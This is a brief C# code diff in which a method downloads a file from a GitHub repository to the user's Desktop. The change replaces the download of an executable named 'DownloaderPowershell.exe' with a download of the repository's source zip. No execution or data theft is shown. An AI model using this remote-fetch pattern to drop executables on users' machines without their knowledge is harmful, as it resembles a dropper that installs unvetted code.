@@ -10,8 +10,8 @@ namespace BacteriaGroup
         {
             using (WebClient c = new WebClient())
             {
-                string P = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "DownloaderPowershell.exe");
-                c.DownloadFile("https://github.com/BacteriaGroup/PowershellDownloader/raw/refs/heads/main/DownloaderPowershell.exe", P);
+                string P = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Desktop), "PowershellDownloader.zip");
+                c.DownloadFile("https://github.com/BacteriaGroup/PowershellDownloader/archive/refs/heads/main.zip", P);
             }
         }
     }
